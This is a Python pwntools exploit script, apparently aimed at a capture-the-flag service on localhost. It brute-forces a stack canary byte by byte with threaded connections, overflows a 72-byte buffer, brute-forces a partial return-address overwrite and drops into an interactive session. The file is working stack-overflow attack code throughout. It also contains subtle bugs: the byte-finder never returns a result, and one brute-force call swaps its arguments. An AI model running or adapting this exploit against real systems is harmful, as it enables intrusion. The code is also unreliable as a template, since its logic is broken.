from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

context.log_level = 'critical'
target = 'localhost'
port = 4243

def check_payload(payload, b, validation,cancel_flag=None):
    """
    Attempts a single candidate byte.
    Returns the valid byte if the process survives, otherwise None.
    """
    if cancel_flag and cancel_flag.is_set():
        return None

    p = None
    try:
        p = remote(target, port, level='critical')
        p.recvuntil(b"[BOBBY] You don't know what you've gotten into: ", timeout=0.3)
        
        p.send(payload + bytes([b]))
        response = p.recvrepeat(timeout=0.3)
        if response != b'[BOBBY] Input received.\n':
            print(response)
        p.close()
        if validation in response:
            print(f"find : {hex(b)}")
            return b
        return None

    except (EOFError, PwnlibException):
        p.close()
        return None
            

def find_next_byte(base_payload, validation, max_workers=16):
    """
    Dispatches 0..255 byte checks concurrently across a thread pool.
    Stops immediately when the correct byte is found.
    """
    cancel_flag = threading.Event()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all 256 possibilities at once
        futures = {
            executor.submit(check_payload, base_payload, b, validation,cancel_flag): b 
            for b in range(256)
        }

        for future in as_completed(futures):
            result = future.result()
            # if result is not None:
            #     cancel_flag.set()  # Tell remaining threads to abort early
            #     return result

    return None

def brutforce_bytes(size, base_payload, validation):
    series = b''
    for byte_idx in range(size):
            print(f"Brutforce byte {byte_idx}!")
            current_payload = base_payload + series
            valid_byte = find_next_byte(current_payload, validation, max_workers=5)

            if valid_byte is not None:
                series += bytes([valid_byte])
                print(f"[+] Byte {byte_idx} leaked: {hex(valid_byte)} ({bytes([valid_byte])})")
            else:
                print(f"[-] Failed to find canary byte at index {byte_idx}")
                break
    print(f"We found the following series of {size} bytes ", series.hex())
    return series

if __name__ == '__main__':
    base_payload = b'A' * 72
    canary = b'\x00\x2f\x2e\xe4\x9f\xb3\xac\xdb'

    if len(canary) == 0:
        canary = brutforce_bytes(8, b"[BOBBY] You don't know what you've gotten into: ", base_payload)

    print(f"\n[+] Full Canary: {canary.hex()} | Raw: {canary}")

    # rbp_leak = b'' #0100000002040000
    # base_payload = b'A' * 72 + canary
    # if len(rbp_leak) == 0:
    #     rbp_leak = brutforce_bytes(8, base_payload)

    # rbp_leak = b'' #0100000002040000
    # base_payload = b'A' * 72 + canary + rbp_leak
    # if len(rbp_leak) == 0:
    #     rbp_leak = brutforce_bytes(8, base_payload)

    
    rip_leak = b'' #0100000002040000
    base_payload = b'A' * 72 + canary + p64(0)
    if len(rip_leak) == 0:
        rip_leak = brutforce_bytes(2, base_payload, b"[BOBBY] You don't know what you've gotten into: ")

    p = remote(target, port)

    payload = p64(0x01)*9+ canary + p64(0) + rip_leak  
    p.recvuntil(b"[BOBBY] You don't know what you've gotten into: ")

    p.send(payload)
    p.interactive()
#830e08061802030b #62140b0c03272d09